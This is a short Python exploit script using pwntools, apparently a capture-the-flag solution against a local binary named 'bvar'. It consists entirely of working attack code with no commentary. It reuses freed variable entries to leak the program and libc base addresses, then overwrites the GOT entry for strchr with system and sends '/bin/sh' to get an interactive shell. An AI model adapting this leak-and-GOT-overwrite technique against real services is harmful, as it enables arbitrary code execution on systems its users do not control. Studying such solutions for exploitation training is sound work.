from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)

p = process('./bvar')
# p = remote('localhost', 7777)
e = ELF('./bvar')
# libc = ELF('./libc-2.31.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal = 'bash'

def create(name, data):
    sendlineafter(p, b'>>> ', name+b'='+data)

def delete(name):
    sendlineafter(p, b'>>> ', b'delete '+name)

def clear():
    sendlineafter(p, b'>>> ', b'clear')

def edit(name, new_name):
    sendlineafter(p, b'>>> ', b'edit '+name)
    sendline(p, new_name)

def dbg(p):
    gdb.attach(p)
    pause()

create(b'A', b'A')
delete(b'A')
create(b'A', b'\x94')
sendlineafter(p, b'>>> ', b'A')
e.address = u64(p.recvline()[:-1].ljust(8, b'\0')) - 0x3594
print(hex(e.address))
clear()

create(b'A', b'A')
delete(b'A')
create(b'A', p64(e.got['exit']))
sendlineafter(p, b'>>> ', b'')
libc.address = u64(p.recvline()[:-1].ljust(8, b'\0')) - libc.symbols['exit']
print(hex(libc.address))
clear()

strchr = 0x187ff0
create(b'A', b'A')
delete(b'A')
create(b'A', p64(e.got['strchr']-8))
edit(p32(libc.address+strchr&0xffffffff), p32(libc.symbols['system']&0xffffffff))
sendlineafter(p, b'>>> ', b'/bin/sh')
p.interactive()
